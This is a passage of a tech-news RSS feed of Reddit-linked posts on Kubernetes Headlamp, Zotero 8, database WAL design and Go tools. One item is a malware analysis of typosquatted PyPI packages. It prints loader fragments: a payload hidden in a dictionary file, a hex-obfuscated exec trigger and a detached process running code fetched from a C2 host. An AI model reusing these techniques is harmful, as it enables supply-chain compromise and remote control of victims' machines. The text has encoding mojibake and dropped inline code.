world, the most popular ORM library is Gorm. Gorm usually manages your
DB connection for you automatically, but in the case of Dolt embedded we want something slightly
different: we want it to use its MySQL dialect and logic but connect to an embedded Dolt database
connection. This is pretty easy to do.Note that we need to import both the MySQL driver and the Dolt driver for this to work. But
otherwise, itâ€™s a standard Gorm setup.Goâ€™s database drivers are a simple way for database application developers to connect to any of the
many different SQL databases you can run in production with a common interface. Standardizing these
interfaces made it easier for libraries like Gorm to offer support for a larger variety of different
database vendors, since the details of the wire protocols and other tricky bits are hidden by the
abstraction for most uses. And itâ€™s pretty simple to write your own driver if you have a SQL data
source you want other people to connect to.Want to discuss Go database drivers or learn more about Dolt? Visit us on the DoltHub
Discord, where our engineering team hangs out all day. Hope to see
you there.]]></content:encoded></item><item><title>kubernetes-sigs/headlamp in 2025: Project Highlights</title><link>https://kubernetes.io/blog/2026/01/22/headlamp-in-2025-project-highlights/</link><author>/u/illumen</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 22:07:30 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[By Evangelos Skopelitis (Microsoft) |
Thursday, January 22, 2026This announcement is a recap from a post originally published on the Headlamp blog.Headlamp has come a long way in 2025. The project has continued to grow â€“ reaching more teams across platforms, powering new workflows and integrations through plugins, and seeing increased collaboration from the broader community.We wanted to take a moment to share a few updates and highlight how Headlamp has evolved over the past year.Joining Kubernetes SIG UIThis year marked a big milestone for the project: Headlamp is now officially part of Kubernetes SIG UI. This move brings roadmap and design discussions even closer to the core Kubernetes community and reinforces Headlampâ€™s role as a modern, extensible UI for the project.Linux Foundation mentorshipThis year, we were excited to work with several students through the Linux Foundationâ€™s Mentorship program, and our mentees have already left a visible mark on Headlamp: built the KEDA plugin, adding a UI in Headlamp to view and manage KEDA resources like ScaledObjects and ScaledJobs. set up an OpenTelemetry-based observability stack for Headlamp, wiring up metrics, logs, and traces so the project is easier to monitor and debug. led a UX audit of Headlamp plugins, identifying usability issues and proposing design improvements and personas for plugin users. developed the Karpenter plugin, giving Headlamp a focused view into Karpenter autoscaling resources and decisions. improved Gateway API support, so you can see networking relationships on the resource map, as well as improved support for many of the new Gateway API resources. worked on backend caching for Kubernetes API calls, reducing load on the API server and improving performance in Headlamp.Managing multiple clusters is challenging: teams often switch between tools and lose context when trying to see what runs where. Headlamp solves this by giving you a single view to compare clusters side-by-side. This makes it easier to understand workloads across environments and reduces the time spent hunting for resources.View of multi-cluster workloadsKubernetes apps often span multiple namespaces and resource types, which makes troubleshooting feel like piecing together a puzzle. Weâ€™ve added  to give you an application-centric view that groups related resources across multiple namespaces â€“ and even clusters. This allows you to reduce sprawl, troubleshoot faster, and collaborate without digging through YAML or cluster-wide lists.View of the new Projects featureNew â€œProjectsâ€ feature for grouping namespaces into app- or team-centric projectsExtensible Projects details view that plugins can customize with their own tabs and actionsNavigation and ActivitiesDay-to-day ops in Kubernetes often means juggling logs, terminals, YAML, and dashboards across clusters. We redesigned Headlampâ€™s navigation to treat these as first-class â€œactivitiesâ€ you can keep open and come back to, instead of one-off views you lose as soon as you click away.A new task bar/activities model lets you pin logs, exec sessions, and details as ongoing activitiesAn activity overview with a â€œClose allâ€ action and cluster informationMulti-select and global filters in tablesWhen something breaks in production, the first two questions are usually â€œwhere is it?â€ and â€œwhat is it connected to?â€ Weâ€™ve upgraded both search and the map view so you can get from a high-level symptom to the right set of objects much faster.View of the new Advanced Search featureAn Advanced search view that supports rich, expression-based queries over Kubernetes objectsImproved global search that understands labels and multiple search items, and can even update your current namespace based on what you findEndpointSlice support in the Network sectionA richer map view that now includes Custom Resources and Gateway API objectsWeâ€™ve put real work into making OIDC setup clearer and more resilient, especially for in-cluster deployments.View of user information for OIDC clustersUser information displayed in the top bar for OIDC-authenticated usersPKCE support for more secure authentication flows, as well as hardened token refresh handlingDocumentation for using the access token using -oidc-use-access-token=trueImproved support for public OIDC clients like AKS and EKSWeâ€™ve broadened how you deploy and source apps via Headlamp, specifically supporting vanilla Helm repos.A more capable Helm chart with optional backend TLS termination, PodDisruptionBudgets, custom pod labels, and moreImproved formatting and added missing access token arg in the Helm chartNew in-cluster Helm support with an  flag and a service proxyFinally, weâ€™ve spent a lot of time on the things you notice every day but donâ€™t always make headlines: startup time, list views, log viewers, accessibility, and small network UX details. A continuous accessibility self-audit has also helped us identify key issues and make Headlamp easier for everyone to use.View of the Learn section in docsSignificant desktop improvements, with up to 60% faster app loads and much quicker dev-mode reloads for contributorsNumerous table and log viewer refinements: persistent sort order, consistent row actions, copy-name buttons, better tooltips, and more forgiving log inputsAccessibility and localization improvements, including fixes for zoom-related layout issues, better color contrast, improved screen reader support, and expanded language coverageMore control over resources, with live pod CPU/memory metrics, richer pod details, and inline editing for secrets and CRD fieldsA refreshed documentation and plugin onboarding experience, including a â€œLearnâ€ section and plugin showcaseA more complete NetworkPolicy UI and network-related polishNightly builds available for early testingPlugins and extensibilityDiscovering plugins is simpler now â€“ no more hopping between Artifact Hub and assorted GitHub repos. Browse our dedicated Plugins page for a curated catalog of Headlamp-endorsed plugins, along with a showcase of featured plugins.View of the Plugins showcaseManaging Kubernetes often means memorizing commands and juggling tools. Headlampâ€™s new AI Assistant changes this by adding a natural-language interface built into the UI. Now, instead of typing  or digging through YAML you can ask, â€œIs my app healthy?â€ or â€œShow logs for this deployment,â€ and get answers in context, speeding up troubleshooting and smoothing onboarding for new users. Learn more about it here.Alongside the new AI Assistant, weâ€™ve been growing Headlampâ€™s plugin ecosystem so you can bring more of your workflows into a single UI, with integrations like Minikube, Karpenter, and more.Highlights from the latest plugin releases:Minikube plugin, providing a locally stored single node Minikube clusterKarpenter plugin, with support for Azure Node Auto-Provisioning (NAP)KEDA plugin, which you can learn more about hereAlongside new additions, weâ€™ve also spent time refining plugins that many of you already use, focusing on smoother workflows and better integration with the core UI.View of the Backstage plugin: Updated for Flux v2.7, with support for newer CRDs, navigation fixes so it works smoothly on recent clusters: Now supports Helm repos in addition to Artifact Hub, can run in-cluster via /serviceproxy, and shows both current and latest app versions: Improved card layout and accessibility, plus dependency and Storybook test updates: Dependency and build updates, more info hereWeâ€™ve focused on making it faster and clearer to build, test, and ship Headlamp plugins, backed by improved documentation and lighter tooling.View of the Plugin Development guideImproved type checking for Headlamp APIs, restored Storybook support for component testing, and reduced dependencies for faster installs and fewer updatesDocumented plugin install locations, UI signifiers in Plugin Settings, and labels that differentiated shipped, UI-installed, and dev-mode pluginsWe've also been investing in keeping Headlamp secure â€“ both by tightening how authentication works and by staying on top of upstream vulnerabilities and tooling.We've been keeping up with security updates, regularly updating dependencies and addressing upstream security issues.We tightened the Helm chart's default security context and fixed a regression that broke the plugin manager.We've improved OIDC security with PKCE support, helping unblock more secure and standards-compliant OIDC setups when deploying Headlamp in-cluster.Thank you to everyone who has contributed to Headlamp this year â€“ whether through pull requests, plugins, or simply sharing how you're using the project. Seeing the different ways teams are adopting and extending the project is a big part of what keeps us moving forward. If your organization uses Headlamp, consider adding it to our adopters list.If you haven't tried Headlamp recently, all these updates are available today. Check out the latest Headlamp release, explore the new views, plugins, and docs, and share your feedback with us on Slack or GitHub â€“ your feedback helps shape where Headlamp goes next.]]></content:encoded></item><item><title>Zotero 8 released (reference management)</title><link>https://www.zotero.org/blog/zotero-8/</link><author>/u/dbcoopernz</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 20:31:58 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Weâ€™re excited to announce our latest major release, Zotero 8. Zotero 8 builds on the new design and features of Zotero 7 and includes a huge number of improvements and refinements.Redesigned Citation DialogZotero 8 introduces a new unified citation dialog, replacing the previous citation dialog (the â€œred barâ€), the â€œclassicâ€ citation dialog, and the Add Note dialog (the â€œyellow barâ€).The new dialog has two modes: List mode and Library mode. List mode lets you quickly search for citations from across your Zotero libraries by title, creator, and year. Library mode includes a library browser, letting you find items in specific libraries or collections. You can switch between the two modes with a single click, preserving any added items or entered search terms. By default, it will open in the last mode you used, but you can choose a different default mode in the settings.In Zotero 7, we added the ability to quickly add citations for selected items and open documents. In the new dialog, these options are available in both List mode and Library mode, so you can make these quick selections even if you otherwise prefer to add items via the library browser.As before, once youâ€™ve selected an item, you can click on its bubble to customize the citation with a page number, prefix, etc. Itâ€™s also now possible to add any locator â€” not just a page number â€” right from the search bar by typing the full or short name (e.g., â€œline 10â€ or â€œl. 10â€ after the citation and pressing Enter/Return.You can switch between adding citations and adding notes using buttons in the bottom left, corresponding to the Add/Edit Citation and Add Note buttons in your word processor.(For those coming from the classic dialog, note that thereâ€™s no text field to make manual edits to citations. Itâ€™s been possible to edit citations directly in the document for many years, which is why the red bar didnâ€™t include such a text field either. More importantly, though, such manual edits should be avoided in almost all cases. Instead, customize the citation via the citation dialog, which will allow Zotero to continue to update the citation as necessary.)Annotations in the Items ListAnnotations you make on PDFs, EPUBs, and webpage snapshots now show up under their parent attachments in the items list.Showing annotations in the items list makes it easier to view annotations across a library or collection, and it also makes it possible to search for annotations directly. For example, you can search for all annotations in a collection with a given tag and then create a note from those annotations or copy them to an external text editor with Quick Copy.In Advanced Search, you can use â€œItem Typeâ€ â€œisâ€ â€œAnnotationâ€ to match annotations or use the Annotation Text and Annotation Comment search conditions to search for specific parts of the annotation.You can assign tags to selected annotations by dragging them to the tag selector, just like other items.Selected annotations show up in the item pane, grouped by top-level item.Reader Appearance Panel with Theme SupportWeâ€™ve added a new Appearance panel in the reader that provides quick access to view settings and introduces support for reader themes.The view settings are per-document settings. Themes are applied globally for all documents, including in the attachment preview in the item pane, and apply to PDFs, EPUBs, and webpage snapshots.We offer a number of built-in themes (â€œDarkâ€, â€œSnowâ€, â€œSepiaâ€), and you can create custom themes just by specifying a foreground and background color. (Some other theme engines require additional accent colors, but weâ€™ve tried to make this as simple as possible for users by automatically adjusting other colors based on the foreground and background colors.) You can set a different theme that applies to light mode and dark mode.The themes replace the previous on-by-default â€œUse Dark Mode for Contentâ€ option, which inverted images in dark mode. Weâ€™re now simply darkening images a bit when using a dark theme. Images and ink annotations in the reader sidebar and note editor are now only darkened as well (and only when Zotero itself is in dark mode).When possible, we also try to apply themes to PDF pages containing full-page images, such as scanned papers, by replacing whitish/dark colors with theme colors. (Otherwise we simply darken the page slightly.)Itâ€™s now possible to open notes in tabs in addition to separate windows. Note tabs fill the whole window, with wide margins for better readability and a clean, distraction-free space for note-taking.By default, double-clicking a note in the items list will open it in a tab. You can choose to open the note in the other space from the context menu, and you can change the default behavior using the â€œOpen notes in new windows instead of tabsâ€ setting in the General pane of the settings.Notes in tabs have a separate font size setting in the View menu.Reading Mode for Webpage SnapshotsReading Mode reformats webpage snapshots for easier reading, with unnecessary page elements removed. You can adjust line height and other view options from the Appearance panel.Weâ€™ve reworked the tabs menu to make it faster to interact with via the keyboard.You can now press Ctrl/Cmd-; to bring up the menu at any time.Once the menu is open, it simultaneously accepts search input, up/down navigation, and row selection, without the need to move between different parts of the menu. You can simply start typing the name of an open tab and then press Enter/Return to switch to it once youâ€™ve narrowed down the list.Itâ€™s also possible to quickly close multiple tabs by moving between the row close buttons with up/down and pressing space bar to close a tab.Zotero now automatically keeps attachment filenames in sync with parent item metadata as you make changes (e.g., changing the title). In previous versions, while Zotero would automatically rename files when you first added them to your library, if you later edited the itemâ€™s metadata, you would need to right-click on the attachment and select â€œRename File from Parent Metadataâ€.You can configure which file types renaming applies to from the General tab of the Zotero settings.After upgrading to this version, existing eligible files that donâ€™t match the current filename format wonâ€™t be automatically renamed, but you can choose to rename them en masse from the Zotero settings. Zotero will also prompt you to rename all files if you change the filename format.â€œRename File from Parent Metadataâ€ has been removed from the item context menu. If a filename doesnâ€™t match the configured filename format (e.g., because automatic renaming is disabled or you changed the format but didnâ€™t choose to rename all files), you can click the â€œRename File to Match Parent Itemâ€ button next to the filename in the attachmentâ€™s item pane to rename it.New Attachment Title OptionsZotero 7 introduced more consistent handling of attachment titles, preserving simpler, less-redundant titles (e.g., â€œFull Text PDFâ€ or â€œPreprint PDFâ€) in cases where the title was previously changed to match the filename. Zotero 8 further refines its renaming and titling logic when adding multiple and/or non-primary attachments, to bring the functionality better in line with the intended behavior.Weâ€™ve also added a â€œNormalize Attachment Titlesâ€ option under Tools â†’ Manage Attachments to update old primary attachments with titles matching the filename to use simpler titles such as â€œPDFâ€.While we recommend the default behavior, allowing Zotero to rename primary files and keep them renamed while using simpler titles in the items list, if you really prefer to view filenames instead of titles, you can now enable â€œShow attachment filenames in the items listâ€ option in the General pane of the settings.Zotero 8 adds a version for Linux running on ARM64 devices. This includes ARM-based Chromebooks, Apple Silicon Macs running Linux (Linux VMs, Asahi Linux), and Raspberry Pis.If youâ€™ve been unable to run Zotero on your ARM-based device, or youâ€™ve been running the x86_64 version under emulation, give it a try.User Interface ImprovementsWeâ€™ve made a number of changes across the interface to address common requests:A new button in the library tab allows you to quickly close the item pane without dragging its edge or using the menus.You can reorder item pane sections by dragging their icons in the side navigation bar.You can drag items, collections, and searches into the trash.You can drag attachments, notes, and related items from the item pane (e.g., to copy files to the filesystem or use Quick Copy).Collections automatically expand when you drag over them, making it easier to drop collections or items into subcollections.You can delete attachments from the item pane.Tabs maintain their size as you close them for faster closing of multiple tabs.With Zotero 8, the Zotero Connector save popup can autocomplete tags in your Zotero library and allows you to add a note to items as you save them.Zotero 8 includes much more than we can list here. See the changelog for additional details.If youâ€™re already running Zotero, you can upgrade from within Zotero by going to Help â†’ â€œCheck for Updatesâ€¦â€.
								This entry was posted
								 
								on Thursday, January 22nd, 2026 at 12:52 pm by Dan Stillman								and is filed under Features, News.
																							]]></content:encoded></item><item><title>Flabbergasted by VM performance (on my Intel Xe 13th gen integrated graphics, so different from i915 in some ways)</title><link>https://www.reddit.com/r/linux/comments/1ql1liu/flabbergasted_by_vm_performance_on_my_intel_xe/</link><author>/u/Natural-Bowl5439</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 20:13:32 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[After breaking the kernel trying to share the GPU with the help of a non-mature SR-IOV implementation, all this in order to have maximum GPU performance between host and guest, I decided after the defeat to go with the traditional GPU acceleration instead.I feared the old days of trying virtualbox and seeing that the "acceleration" was just good for windows aero, hence the reason i explored SR-IOV. I expected VMware's performance to not be far from my memories with virtualbox, but to my surprise i could allocate 8GB of graphics memory to the VM! Then i tested resident evil 6 and it ran at playable framerate! (around 40fps although at low settings but 1080p resolution) I hope i will still be pleasantly surprised when I'll try the real use of the windows VM : video editing with Capcut and video rotoscoping with Photoshop. ]]></content:encoded></item><item><title>Overrun with AI slop, cURL scraps bug bounties to ensure &quot;intact mental health&quot;</title><link>https://arstechnica.com/security/2026/01/overrun-with-ai-slop-curl-scraps-bug-bounties-to-ensure-intact-mental-health/</link><author>/u/Drumedor</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 19:47:01 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Anyone here built microservices in Go with GraphQL, gRPC, and RabbitMQ?</title><link>https://www.reddit.com/r/golang/comments/1ql0g9l/anyone_here_built_microservices_in_go_with/</link><author>/u/riswan_22022</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 19:30:46 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Iâ€™m working with Go and exploring a microservices architecture using , , , and a database (MongoDB / PostgreSQL ).I wanted to ask if anyone here has built something similar in real projects. If you have a , example project, or even a blog explaining your approach, Iâ€™d really appreciate it if you could share.]]></content:encoded></item><item><title>mmdr: A native Rust Mermaid renderer (500-1000x faster than mermaid-cli)</title><link>https://github.com/1jehuang/mermaid-rs-renderer</link><author>/u/Medium_Anxiety_8143</author><category>rust</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 19:00:55 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>[D] Is Grokking unique to transformers/attention?</title><link>https://www.reddit.com/r/MachineLearning/comments/1qkz5do/d_is_grokking_unique_to_transformersattention/</link><author>/u/Dependent-Shake3906</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 18:43:38 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Is Grokking unique to attention mechanism, every time Iâ€™ve read up on it seems to suggest thatâ€™s it a product of attention and models that utilise it. Is this the case or can standard MLP also start grokking?]]></content:encoded></item><item><title>Breaking Key-Value Size Limits: Linked List WALs for Atomic Large Writes</title><link>https://unisondb.io/blog/breaking-kv-size-limits-linked-list-wal/</link><author>/u/ankur-anand</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 18:38:40 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[The â€œHard Wallâ€ of Distributed Systems#The majority of distributed Key-Value systems have some kind of limit. This limit exists for a purpose: it prevents a single request from overwhelming memory or stalling replication.Whether itâ€™s the 512KB cap in Consul
or the 1.5MB default in etcd
, these boundaries are a survival mechanism. In a distributed cluster, every byte you write has to be replicated via protocols like Raft. If a single record is too large, it creates â€œhead-of-line blockingâ€â€”the entire replication pipeline slows down just to move one massive object, potentially causing heartbeats to fail and nodes to drop out of the cluster.At UnisonDB, we respect these same limits to protect our own system health. We need to be even more cautious about this, as we are not just doing Raft replication for writes. We also have high-fanout ISR (in-sync-replica) based edge replicas, meaning a single write can propagate to many more nodes.Why ISR Edge Replication Changes the Stakes#In our environment, the â€œHard Wallâ€ isnâ€™t just about protecting memory or Raft heartbeats within a small core cluster. It is about protecting the replication integrity and lag across a vast edge network.Heartbeat Fragility in Edge Environments: Edge networks often have variable latency and less reliable connections. If replication takes too long because of oversized records, the system might falsely flag an edge node as â€œout of sync,â€ triggering expensive and unnecessary full re-syncs, wasting bandwidth and compute.Memory Pressure on Constrained Edge Nodes: Unlike robust core cluster nodes, edge replicas frequently run on more resource-constrained hardware. Pushing a 20MB block in a single request could easily cause an Out Of Memory (OOM) event on a smaller edge instance, leading to outages at the edge.But even with these constraints, we also understand that the need for large Key-Value storage hasnâ€™t gone awayâ€”it has actually intensified. As an Edge-replicated, general-purpose Multi-Modal database, we see this constantly. Whether itâ€™s a massive JSON configuration or high-dimensional vectors for AI use cases, modern data frequently pushes past those old boundaries.This size pressure usually shows up in two ways:: A single transaction involving multiple Key-Value pairs that, when grouped together, exceed the 1MB limit.: A single row containing hundreds of columns where the aggregate size of the update blows past the ceiling.In both cases, the user will expects the same ironclad KV guarantees they get with a tiny 1KB write. You shouldnâ€™t have to sacrifice Atomicity just because your data model is complex.Why Manual Chunking Fails#When engineers hit a size limit, the instinctive reaction is to â€œchunkâ€ the data by splitting a 10MB write into ten separate 1MB requests. This is where things get dangerous. Without a specialized architecture, you lose the atomicity promise. If your connection drops after chunk seven, the database is left in a â€œzombieâ€ state. You have a partial update that is neither the old version nor the new one. In a real database, the rule is absolute: it must be all or nothing.Unisondb Solution: A WAL That Remembers Its Past#To solve this at UnisonDB, we stopped looking at the Write-Ahead Log (WAL) just as a flat, sequential file. Instead, we treated it as a backward-linked list.By adding a simple breadcrumbâ€”a PrevTxnWalIndexâ€”to every WAL record that are part of the same transaction, each chunk of data points back to the one that came before it. This allows us to stitch a single, massive transaction together across multiple physical writes without ever sending a request that exceeds the safety limit.This logic is the backbone of how we handle large multi-modal data. The lifecycle of a transaction in our dbkernel looks like this:: We write an anchor record to the WAL. This initializes the transaction and generates a unique ID.: As you stream your data chunks, each one links back to the previous disk offset. Even if you send 50 chunks to stay under the limit, the database knows they belong to one chain.: This is the atomic switch. The final record acts as the seal.Nothing becomes visible to you the user until that COMMIT record is successfully flushed to disk. If the stream breaks halfway through, the database simply ignores those dangling fragments during the next recovery scan.The engine needs to know exactly where the previous piece of the puzzle lives on disk. We use physical disk offsets to create this chain.Here is how this looks inside the UnisonDB transaction engine. Notice how we track the prevOffset to build the link on the fly. In the AppendKVTxn function, we take the current prevOffset and bake it into the new log record before appending it to the WAL.When  happens, the Commit function writes the final link. Only after the WAL confirms the commit do we flush the data to the in-memory MemTable.When UnisonDB reboots after a crash, the recovery process starts from the last known checkpoint. As the engine scans the log forward from that point, it looks specifically for COMMIT records. Because our transaction chunks are chained together using physical disk offsets, the engine has a clear map to follow.When a commit record is encountered, the engine uses the PrevTxnWalIndex to walk the chain of that specific transaction. It jumps from the commit record to the previous data chunk, and then to the one before that, continuing until it reaches the BEGIN record. This allows the engine to gather all the related pieces of a large Key-Value pair, Wide-Column row, or LOB without having to inspect unrelated transaction data that might be sitting in between those chunks.Reconstructing the Value#The GetTransactionRecords function is what performs this backward walk. It takes the offset of the commit record and follows the trail until the chain is complete.By chaining the records this way, we ensure that a large value is only rebuilt if the final commit record exists. If the engine finds chunks that donâ€™t lead to a commit, it simply ignores them. This keeps the data consistent and ensures that the all or nothing promise is maintained for every data model we support.Building a database is often a game of trade-offs. You want system stability, but you also want to support modern, heavy workloads like AI and complex multi-modal schemas.By treating the Write-Ahead Log as a linked list, we found a way to have both. We keep our network requests small and safe, but we allow our data to be as large as it needs to be.Whether it is a simple Key-Value pair, a massive Wide-Column row, or a Large Object, the atomicity promise remains unbroken.If you found this article helpful, or if youâ€™re interested in the future of edge-replicated data, weâ€™d love your support.]]></content:encoded></item><item><title>wayscriber 0.9.9 released!</title><link>https://www.reddit.com/r/linux/comments/1qkyo99/wayscriber_099_released/</link><author>/u/Leading_Yam1358</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 18:26:05 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Wayscriber is a live annotation tool for Linux(Wayland) - a draw-on-anything overlay for demos, teaching, or quick callouts. Or just draw over any app or screen for funs :)You get pens/highlighters/shapes/Text plus zoom, freeze, click highlights, and fast screenshots. It is lightweight, written in Rust, and highly customizable.Has multiple boards and pages per boards. Can customise it all.Set up as daemon/tray so you can show or hide it any time.It runs as a lightweight overlay and has an optional GUI Configurator. You can also customise all via TOML file. Give it a try. Star and spread the word if you like it. I am looking forward to any feedback. The goal atm is to make it as powerful as possible while keeping it simple by default, and not overwhelming for new users.# Wayscriber 0.9.9 (since v0.9.8) - this is the biggest update so far!- Multiâ€‘board support with improved board/page picker, status bar toggles, and safe delete confirmations.- New tools: eraser tool + variableâ€‘thickness stylus lines.- New workflows: command palette, guided tour onboarding, configurable presenter mode.- Major rendering/perf upgrades via damage tracking (dirtyâ€‘rect) and caching.- Boards toolbar section, board/page toggles in status bar, board picker improvements.- Confirmations for board/page deletion + timeouts; board picker redraw on close.- Quick help overlay + keybinding; help overlay layout refinements.- Command palette with Unicodeâ€‘safe search.- Guided tour onboarding, welcome toast, and recovery hardening.- Presenter mode: new toggle/bind, constraints, tool switching allowed.- Optional numbered arrow labels + reset action and toolbar toggle.- Text controls enabled by default.- Toolbars: pinned toolbars shown by default, improved drawers, stable drag via pointer lock.- Tooltips: better placement, selection shortcut, color swatch tooltips w/ bindings.- UI polish: View tab renamed to Canvas, zoom actions toggle, attention dot + More hint.- Defaults: Ubuntu/GNOME PageUp/PageDown page navigation bindings.- Damage tracking/dirtyâ€‘rect rendering for faster redraws.- Cached help overlay layout/text and badge extents.- Optimized eraser hover indices, selection cloning, spatial hit tests.- Preallocated dirty regions + pooled damage tracking improvements.- Noâ€‘vsync frame rate cap.- Autosave scheduling + tracking; fixes for autosave clearing.- Better tablet pressure handling.- Clipboard fallback exit/retry fix.- Screenshot suppression timing fix.- Tooltip placement + board picker spacing fixes.- Pango text rendering for UI labels.- Nix flake packaging + install docs.- Config/docs updates and refactors for action metadata + toolbar constants.Thanks @n3oney for the first contribution!]]></content:encoded></item><item><title>Malicious PyPI Packages spellcheckpy and spellcheckerpy Deliver Python RAT</title><link>https://www.aikido.dev/blog/malicious-pypi-packages-spellcheckpy-and-spellcheckerpy-deliver-python-rat</link><author>/u/Advocatemack</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 17:17:23 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[On January 20th and 21st, 2026, our malware detection pipeline flagged two new PyPI packages:  and . Both claimed to be the legitimate author of pyspellchecker library. Both are linked to his real GitHub repo.Hidden inside the Basque language dictionary file was a base64-encoded payload that downloads a full-featured Python RAT. The attacker published three "dormant" versions first, payload present, trigger absent, then flipped the switch with  v1.2.0, adding an obfuscated execution trigger that fires the moment you import .The payload hiding in plain sightThe malware authors got creative. Instead of the usual suspects ( scripts, obfuscated , they buried the payload inside , a file that legitimately contains Basque word frequencies in the real  package.Here's the extraction function in :        data = json.loads(f.read())
Looks innocent. But when called with test_file("eu", "utf-8", "spellchecker"), it doesn't retrieve word frequencies. It retrieves a base64-encoded downloader hidden among the dictionary entries under a key called spellchecker.In the first three versions, the payload gets extracted and decoded... but never executed:A loaded gun with the safety on.Then came  v1.2.0. The attacker moved the trigger to  and added obfuscation:    self._evaluate = TrueDo you see it? That bytes.fromhex("65786563") decodes to "".Instead of writing  directly, which static scanners would flag,they reconstruct the string from hex at runtime. Import , instantiate it, and the RAT executes.The RAT: Full remote controlThe stage-1 payload is a downloader. It fetches the real payload from https://updatenet[.]work/settings/history.php and spawns it in a detached process:    stdin=subprocess.PIPE, 
    stdout=subprocess.DEVNULL, 
    stderr=subprocess.DEVNULL,
    start_new_session=True
)
p.stdin.write(downloaded_payload)
p.stdin.close()
That is key: The RAT survives even if your script exits. No files written to disk. Silent. Detached.The stage-2 RAT is a full-featured remote access trojan with some interesting characteristics:System fingerprinting on init:Dual-layer XOR encryption for C2 comms: The RAT uses a 16-byte XOR key ([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5]) for the outer layer, then a secondary XOR with key 123 for command payloads. Not cryptographically strong, but enough to evade signature-based detection. Commands come back as [4-byte command ID][4-byte length][XOR-encrypted payload]. The RAT parses this, decrypts, and dispatches.Arbitrary code execution: When command ID 1001 arrives, the RAT just... runs it:    exec(szCode) The RAT phones home every 5 seconds to https://updatenet[.]work/update1.php, sending its victim ID (campaign ) and waiting for commands. SSL certificate validation is disabled via ssl._create_unverified_context().The C2 domain  resolves to infrastructure with a documented history of hosting malicious activity.Registered: 28 October 2025 (approximately 3 months before malware publication)IP Address: ASN: AS14956 RouterHosting LLCLocation: Dallas, Texas, USAAssociated Domain: cloudzy.com RouterHosting LLC operates as Cloudzy, a hosting provider that has been extensively documented as a "Command-and-Control Provider" (C2P). In August 2023, Halcyon published a report titled "Cloudzy with a Chance of Ransomware" that found 40-60% of Cloudzy's traffic was malicious in nature. The report linked Cloudzy infrastructure to APT groups from China, Iran, North Korea, Russia, and other nations, as well as ransomware operators and a sanctioned Israeli spyware vendor.Connection to previous campaignsThis isn't an isolated incident. In November 2025, HelixGuard documented a similar attack using the spellcheckers package (same target, different name). That campaign used the same RAT structure: XOR encryption, command ID 1001, exec(),Â  but different C2 infrastructure (). The HelixGuard report linked that campaign to fake recruiter social engineering targeting cryptocurrency holders.Different domains, same playbook. This appears to be the exact same threat actor at play.Â  spellcheckerpy (all versions), spellcheckpy (all versions)https://updatenet[.]work/settings/history.php (stage-2 delivery)https://updatenet[.]work/update1.php (beacon endpoint) (AS14956 RouterHosting LLC / Cloudzy)XOR Key: 03 06 02 01 06 00 04 07 00 01 09 06 08 01 02 05, key spellchecker]]></content:encoded></item><item><title>Got tired of distributing large files, so I built this open-source P2P transfer CLI tool in Go</title><link>https://www.reddit.com/r/golang/comments/1qkwqxp/got_tired_of_distributing_large_files_so_i_built/</link><author>/u/samsungplay</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 17:16:43 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I recently needed to move a bunch of large files between machines and I realized how more difficult things are than it should be. I'm aware there might be some tools out there that might achieve similar things, but I still wanted to take on the challenge myself.As a result, I built a small tool to handle the cases I kept tripping over and decided to share it with the community.The goal is very simple. Just get the files from one machine to other machines and be done with it. And with no other setup other than the installation itself.Itâ€™s called . Itâ€™s written in Go and uses direct peer-to-peer transfers over QUIC. Files go straight between machines, and each receiver connects independently - which also makes it possible to share the same data with more than one machine without restarting the transfer.High throughput, direct P2P transfers over QUICTries to avoid relays via UDP hole-punching (STUN)Resume support if a connection dropsOne sender can serve multiple receiversTwo commands:  /  with default signaling, but everything can be self-hostedStill beta and actively evolvingNo default TURN relay yet (can be self-hosted)If thereâ€™s real usage, Iâ€™ll likely add a relay and maybe a GUI laterThe default signaling servers are capacity-limited but currently handle ~2k concurrent users.Since it is very easy to install and use, I hope some of you guys try it, and better yet, benefit from it in some way or the other. If you find any bugs, have any feedbacks, or if something behaves wildly, I'd really appreciate hearing about it.brew tap samsungplay/thruflux brew install thru thru host ./files thru join ABCDEFGH --out ./downloads ]]></content:encoded></item><item><title>Scaling PostgreSQL to power 800 million ChatGPT users - OpenAI Engineering Blog</title><link>https://openai.com/index/scaling-postgresql/</link><author>/u/vladmihalceacom</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 17:07:00 